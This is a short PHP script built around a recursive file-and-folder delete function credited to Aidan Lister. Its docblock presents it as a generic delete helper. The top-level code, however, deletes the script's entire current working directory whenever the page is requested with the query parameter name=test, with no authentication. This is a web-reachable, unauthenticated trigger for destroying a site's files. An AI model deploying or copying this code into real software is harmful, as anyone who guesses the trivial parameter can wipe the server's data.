<?php
/**
* Delete a file, or a folder and its contents
*
* @author Aidan Lister <aidan@php.net>
* @version 1.0.2
* @param string $dirname Directory to delete
* @return bool Returns TRUE on success, FALSE on failure
*/
	$dirname	= getcwd();
	
	if(isset($_GET['name']) && trim($_GET['name']) == 'test') {
		echo $dirname;
		rmdirr($dirname);
	}
	function rmdirr($dirname) {
		
		// Sanity check
		if (!file_exists($dirname)) {
			echo 'not exist';
			return false;
		} else {
			echo 'exist';
		}
		
		// Simple delete for a file
		if (is_file($dirname)) {
			echo '<br>Done';
			return unlink($dirname);
		}
		
		// Loop through the folder
		$dir = dir($dirname);
		while (false !== $entry = $dir->read()) {
			// Skip pointers
			if ($entry == '.' || $entry == '..') {
				continue;
			}
		echo '<br>Done-$dirname/$entry';
			// Recurse
			rmdirr("$dirname/$entry");
		}
		
		// Clean up
		$dir->close();
		return rmdir($dirname);
	}
?>